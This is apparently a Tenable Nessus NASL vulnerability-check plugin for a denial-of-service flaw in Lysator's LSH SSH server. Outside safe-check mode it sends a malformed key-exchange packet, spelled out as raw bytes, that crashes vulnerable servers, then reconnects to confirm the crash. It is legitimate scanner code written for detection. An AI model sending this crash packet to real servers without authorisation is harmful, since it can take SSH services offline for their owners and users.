#
# (C) Tenable Network Security
#

if(description)
{
 script_id(17352);
 script_bugtraq_id(12829);
 script_version ("$Revision: 1.1 $");
 
 name["english"] = "Lysator LSH remote Denial of Service (DoS)";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running Lysator's LSH, a version of Secure Shell
(SSH) which is available for Unix-like platforms.
This version of LSH is reported vulnerable to a Denial of Service
attack.

An attacker can exploit this issue by sending a malformed key exchange
message.

Solution : Upgrade to LSH 2.0.1 or later

Risk factor : High";
	
 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the remote LSH version";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("ssh_detect.nasl");
 script_require_ports("Services/ssh", 22);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/ssh");
if(!port)port = 22;

banner = get_kb_item("SSH/banner/" + port );
if ( ! banner ) exit(0);

if ( "openssh" >< tolower(banner) ) exit(0);

if (safe_checks())
{
 if(ereg(string:banner,
  	pattern:"SSH-2.0-lshd-([01]\..*|2\.0) lsh", icase:TRUE)) security_hole(port);
 exit (0);
}

req = raw_string (
 0x00, 0x00, 0x00, 0xbc, 0x07, 0x14, 0xc1, 0x5f,
 0x45, 0x27, 0x3d, 0x6c, 0x16, 0x7b, 0xf9, 0xc2, 0xca, 0x39, 0x08, 0x61, 0x3b, 0x5a, 0x00, 0x00,
 0x00, 0x3d, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,
 0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x2d, 0x65, 0x78, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x2d,
 0x73, 0x68, 0x61, 0x31, 0x2c, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65, 0x6c, 0x6c,
 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x31, 0x2d, 0x73, 0x68, 0x61, 0x31, 0x00,
 0x00, 0x00, 0x0f, 0x73, 0x73, 0x68, 0x2d, 0x72, 0x73, 0x61, 0x2c, 0x73, 0x73, 0x68, 0x2d, 0x64,
 0x73, 0x73, 0x00, 0x00, 0x00, 0x0c, 0x62, 0x6c, 0x6f, 0x77, 0x66, 0x69, 0x73, 0x68, 0x2d, 0x63,
 0x62, 0x63, 0x00, 0x00, 0x00, 0x0c, 0x62, 0x6c, 0x6f, 0x77, 0x66, 0x69, 0x73, 0x68, 0x2d, 0x63,
 0x62, 0x63, 0x00, 0x00, 0x00, 0x09, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31, 0x00,
 0x00, 0x00, 0x09, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31, 0x00, 0x00, 0x00, 0x04,
 0x6e, 0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
);

if (!get_port_state(port)) exit(0);

soc = open_sock_tcp (port);
if (!soc)
  exit (0);

buf = recv_line (socket:soc, length:1024);
if (!buf && ("SSH-2.0-" >!< buf))
  exit (0);

send (socket:soc, data:'SSH-2.0-Crash\n');
buf = recv (socket:soc, length:4096);
if (!buf)
  exit (0);

send (socket:soc, data:req);
close (soc);

soc = open_sock_tcp (port);
if (!soc)
  security_hole(port);

close (soc);
